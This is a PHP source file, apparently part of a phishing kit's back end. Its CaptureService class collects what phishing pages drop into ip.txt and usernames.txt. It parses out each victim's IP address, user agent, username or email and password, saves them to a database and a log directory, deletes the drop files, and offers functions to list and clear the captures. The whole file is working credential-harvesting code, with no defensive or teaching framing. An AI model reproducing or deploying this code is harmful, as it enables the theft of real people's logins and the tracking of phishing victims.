<?php
declare(strict_types=1);

final class CaptureService
{
    public static function poll(?int $sessionId): array
    {
        $new = ['ips' => [], 'credentials' => []];

        $ipFile = WWW_DIR . DIRECTORY_SEPARATOR . 'ip.txt';
        if (is_file($ipFile)) {
            $raw = (string) file_get_contents($ipFile);
            $parsed = self::parseIp($raw);
            $row = Store::insertIp($sessionId, $parsed['ip'], $parsed['user_agent'], $raw);
            file_put_contents(AUTH_DIR . DIRECTORY_SEPARATOR . 'ip.txt', $raw, FILE_APPEND);
            @unlink($ipFile);
            $new['ips'][] = array_merge($parsed, $row, ['captured_at' => gmdate('c')]);
        }

        $userFile = WWW_DIR . DIRECTORY_SEPARATOR . 'usernames.txt';
        if (is_file($userFile)) {
            $raw = (string) file_get_contents($userFile);
            $parsed = self::parseCreds($raw);
            $row = Store::insertCreds($sessionId, $parsed['username'], $parsed['password'], $raw);
            file_put_contents(AUTH_DIR . DIRECTORY_SEPARATOR . 'usernames.dat', $raw, FILE_APPEND);
            @unlink($userFile);
            $new['credentials'][] = array_merge($parsed, $row, ['captured_at' => gmdate('c')]);
        }

        return $new;
    }

    /** @return list<array<string, mixed>> */
    public static function listIps(int $limit = 100): array
    {
        return Store::listIps($limit);
    }

    /** @return list<array<string, mixed>> */
    public static function listCreds(int $limit = 100): array
    {
        return Store::listCreds($limit);
    }

    public static function clearAll(): void
    {
        Store::clearCaptures();
    }

    private static function parseIp(string $raw): array
    {
        $ip = '';
        $ua = '';
        if (preg_match('/IP:\s*(.+)/', $raw, $m)) {
            $ip = trim($m[1]);
        }
        if (preg_match('/User-Agent:\s*(.+)/', $raw, $m)) {
            $ua = trim($m[1]);
        }
        return ['ip' => $ip, 'user_agent' => $ua];
    }

    private static function parseCreds(string $raw): array
    {
        $username = '';
        $password = '';
        if (preg_match('/(?:[\w\s]+Username|Email):\s*(.+?)\s+Pass:/i', $raw, $m)) {
            $username = trim($m[1]);
        }
        if (preg_match('/Pass:\s*(.+)/s', $raw, $m)) {
            $password = trim($m[1]);
        }
        return ['username' => $username, 'password' => $password];
    }
}
